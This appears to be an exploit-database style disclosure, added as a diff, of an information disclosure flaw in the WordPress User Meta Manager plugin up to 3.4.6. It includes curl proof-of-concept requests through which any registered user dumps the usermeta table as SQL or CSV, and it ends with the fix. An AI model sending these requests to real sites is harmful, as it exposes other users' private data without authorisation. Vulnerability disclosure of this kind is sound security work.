@@ -1,0 +1,45 @@
+* Exploit Title: WordPress User Meta Manager Plugin [Information Disclosure]
+* Discovery Date: 2015-12-28
+* Public Disclosure Date: 2016-02-01
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: http://jasonlau.biz/home/
+* Software Link: https://wordpress.org/plugins/user-meta-manager/
+* Version: 3.4.6
+* Tested on: WordPress 4.4
+* Category: webapps
+
+## Description
+
+User Meta Manager for WordPress plugin up to v3.4.6 suffers from a information disclosure vulnerability. Any registered user can perform an a series of AJAX 
+requests, in order to get all contents of `usermeta` DB table. 
+
+`usermeta` table holds additional information for all registered users. User Meta Manager plugin offers a `usermeta` table backup functionality. During the backup process the plugin takes no action in protecting the leakage of the table contents to unauthorized (non-admin) users.
+
+## PoC
+
+### Get as MySQL query
+
+First a backup table must be created
+
+ 
+curl -c ${USER_COOKIES} \
+    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
+    ?action=umm_switch_action&umm_sub_action=umm_backup"
+
+
+Then we get the table with another request
+
+curl -c ${USER_COOKIES} \
+    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
+    ?action=umm_switch_action&umm_sub_action=umm_backup&mode=sql"
+
+### Get as CSV file
+
+curl -c ${USER_COOKIES} \
+    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
+    ?action=umm_switch_action&umm_sub_action=umm_get_csv"
+
+## Solution
+
+Upgrade to version 3.4.8
